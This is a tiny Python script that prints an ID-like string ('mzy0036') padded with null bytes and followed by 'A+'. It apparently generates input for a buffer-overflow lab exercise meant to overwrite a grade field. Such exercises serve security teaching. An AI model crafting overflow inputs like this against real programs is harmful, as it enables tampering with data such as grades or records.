#!/usr/bin/python

print("mzy0036" + "\x00"*3 + "A+" + "\x00"*5)
